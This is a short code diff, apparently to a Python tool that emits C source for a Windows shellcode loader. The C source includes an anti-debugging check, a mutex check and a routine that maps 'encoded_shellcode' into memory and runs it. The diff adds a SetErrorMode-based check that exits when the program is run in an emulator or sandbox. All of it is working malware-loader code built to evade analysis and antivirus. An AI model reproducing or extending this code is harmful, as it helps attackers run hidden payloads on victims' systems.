@@ -42,7 +42,7 @@ HEADERS_C_CODE = """
 #define DEBUG
 #undef DEBUG
 
-#define BIG_NUMBER 1<<30
+#define BIG_NUMBER 1<<25
 """
 
 STUB_C_CODE = """
@@ -70,7 +70,7 @@ int CheckNtGlobalFlag()
 }
 
 
-LPVOID AllocAndMap(HANDLE *hFile, unsigned char* sc, DWORD dwBytesToRead)
+LPVOID AllocAndMap(unsigned char* sc, DWORD dwBytesToRead)
 {
   LPVOID code;
   DWORD  dwBytesRead;
@@ -122,11 +122,15 @@ TEMPLATE_C_CODE = """
 
   hdlMutex = CreateMutex(NULL, TRUE, _T("f0000000000000000000000000baaaaaaaaaaaaaaaaaaaar"));
   if(!hdlMutex)
-    exit(2);
+    exit(1);
 
   CloseHandle(hdlMutex);
 
-  code = AllocAndMap(NULL, encoded_shellcode, len);
+  SetErrorMode(1024);
+  if (SetErrorMode(0) != 1024)
+    exit(1);
+
+  code = AllocAndMap(encoded_shellcode, len);
   if (!code) exit(3);
 
 #ifdef DEBUG
